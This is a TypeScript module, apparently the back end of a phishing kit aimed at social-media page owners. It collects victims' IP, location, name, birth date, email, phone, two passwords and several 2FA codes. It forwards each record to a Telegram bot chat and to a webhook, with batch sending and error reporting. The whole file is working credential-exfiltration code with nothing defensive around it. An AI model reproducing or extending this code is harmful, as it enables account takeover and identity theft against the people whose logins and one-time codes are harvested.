import axios from 'axios';
import https from 'https';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from '../utils/generateKey';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
const WEBHOOK_URL = process.env.WEBHOOK_URL!;
const agent = new https.Agent({ family: 4 });

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !WEBHOOK_URL) {
    console.warn("⚠️ Environment variables missing!");
}

function mergeData(oldData: any = {}, newData: any = {}) {
    return {
        ...oldData,
        ...Object.fromEntries(
            Object.entries(newData).filter(([_, v]) => v !== undefined && v !== '')
        )
    };
}

function formatMessage(data: any): string {
    return `
<b>Ip:</b> <code>${data.ip || 'Error'}</code>
<b>Location:</b> <code>${data.location || 'Error'}</code>
<b>Full Name:</b> <code>${data.name || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.business || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
<b>Password First:</b> <code>${data.password || ''}</code>
<b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
<b>Auth Method:</b> <code>${data.authMethod || ''}</code>
<b>2FA Codes:</b> <code>${data.twoFa || ''} | ${data.twoFaSecond || ''} | ${data.twoFaThird || ''}</code>
`.trim();
}

// Gửi Telegram
async function sendTelegram(data: any, extraMsg?: string) {
    const key = generateKey(data);
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const text = formatMessage(fullData) + (extraMsg ? `\n\n❌ ERROR: ${extraMsg}` : '');

    try {
        const res = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" },
            { httpsAgent: agent, timeout: 10000 }
        );
        const messageId = res.data.result.message_id;
        memoryStoreTTL.set(key, { message: text, messageId, data: fullData });
        console.log(`✅ Sent Telegram. ID: ${messageId}`);
    } catch (err: any) {
        console.error("❌ Telegram send error:", err?.response?.data || err.message || err);
    }
}

// Gửi lên Webhook
async function sendToWebhook(data: any) {
    try {
        const res = await axios.post(WEBHOOK_URL, {
            timestamp: new Date().toISOString(),
            ...data
        }, {
            headers: { "Content-Type": "application/json" },
            timeout: 10000
        });
        console.log("✅ Sent to Webhook");
        console.log("Webhook response status:", res.status);
        console.log("Webhook response data:", res.data);
    } catch (err: any) {
        let errMsg = "";
        if (err.response) {
            // Server phản hồi lỗi
            console.error("❌ Webhook error response:", err.response.status, err.response.data);
            errMsg = `Webhook error ${err.response.status}: ${JSON.stringify(err.response.data)}`;
        } else if (err.request) {
            console.error("❌ Webhook no response:", err.request);
            errMsg = "Webhook no response from server";
        } else {
            console.error("❌ Webhook request error:", err.message);
            errMsg = err.message;
        }

        // Báo lỗi luôn trên Telegram
        await sendTelegram(data, errMsg);
    }
}

// Gửi Telegram + Webhook 1 object
export async function sendSingleData(data: any) {
    await Promise.all([sendTelegram(data), sendToWebhook(data)]);
}

// Gửi batch nhiều object
export async function sendBatchData(dataList: any[]) {
    const promises = dataList.map(data => sendSingleData(data));
    await Promise.all(promises);
    console.log("✅ All batch data sent");
}
